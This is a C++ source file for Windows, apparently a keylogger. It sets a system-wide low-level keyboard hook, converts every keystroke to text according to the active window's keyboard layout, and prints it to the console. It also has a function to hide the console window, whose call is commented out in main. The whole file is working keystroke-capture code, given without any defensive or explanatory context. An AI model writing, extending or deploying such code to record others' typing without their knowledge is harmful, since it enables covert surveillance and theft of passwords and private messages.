#include <iostream>
#include <windows.h>
#include <stdio.h>
#include <tchar.h>

using namespace std;


HHOOK hHook = NULL;
bool capsLock = false;

LRESULT CALLBACK keyboard_hook(const int code, const WPARAM wParam, const LPARAM lParam) {
    if (code >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT *kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
        DWORD wVirtKey = kbdStruct->vkCode;
        DWORD wScanCode = kbdStruct->scanCode;

        BYTE lpKeyState[256];
        GetKeyboardState(lpKeyState);


        if (wVirtKey == VK_CAPITAL)
        {
            capsLock = !capsLock;
        }

        lpKeyState[VK_CAPITAL] = capsLock ? 0x01 : 0x00;


        // Shift
        if (GetAsyncKeyState(VK_LSHIFT) & 0x8000)
            lpKeyState[VK_LSHIFT] = 0x80;

        if (GetAsyncKeyState(VK_RSHIFT) & 0x8000)
            lpKeyState[VK_RSHIFT] = 0x80;

        if ((GetAsyncKeyState(VK_LSHIFT) & 0x8000) ||
            (GetAsyncKeyState(VK_RSHIFT) & 0x8000))
        {
            lpKeyState[VK_SHIFT] = 0x80;
        }

        // Ctrl
        if (GetAsyncKeyState(VK_LCONTROL) & 0x8000)
            lpKeyState[VK_LCONTROL] = 0x80;

        if (GetAsyncKeyState(VK_RCONTROL) & 0x8000)
            lpKeyState[VK_RCONTROL] = 0x80;

        if ((GetAsyncKeyState(VK_LCONTROL) & 0x8000) ||
            (GetAsyncKeyState(VK_RCONTROL) & 0x8000))
        {
            lpKeyState[VK_CONTROL] = 0x80;
        }

        // Alt / AltGr
        if (GetAsyncKeyState(VK_LMENU) & 0x8000)
            lpKeyState[VK_LMENU] = 0x80;

        if (GetAsyncKeyState(VK_RMENU) & 0x8000)
            lpKeyState[VK_RMENU] = 0x80;

        if ((GetAsyncKeyState(VK_LMENU) & 0x8000) ||
            (GetAsyncKeyState(VK_RMENU) & 0x8000))
        {
            lpKeyState[VK_MENU] = 0x80;
        }




        wchar_t wbuffer[64] = { 0 };

        int result = ToUnicodeEx(wVirtKey,wScanCode,lpKeyState,wbuffer,sizeof(wbuffer)/sizeof(wbuffer[0]),0,GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL)));


        if (result > 0)
        {
            char buffer[64] = { 0 };
            WideCharToMultiByte(CP_UTF8, 0, wbuffer, result, buffer, sizeof(buffer) / sizeof(char), NULL, NULL);
            std::cout << buffer;
        }


    }

    return CallNextHookEx(hHook, code, wParam, lParam);
}

void hideConsoleWindow()
{
    ShowWindow(GetConsoleWindow(),SW_HIDE);
}

void showConsoleWindow()
{
    ShowWindow(GetConsoleWindow(),SW_SHOW);
}

int main()
{
    SetConsoleOutputCP(CP_UTF8);
    //hideConsoleWindow();
    capsLock = (GetKeyState(VK_CAPITAL) & 1) != 0;
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboard_hook, NULL, 0);
    if (hHook == NULL) {
        std::cerr << "Keyboard hook failed!" << std::endl;
        return 1;
    }

    while (GetMessage(NULL, NULL, 0, 0));
    return 0;
}
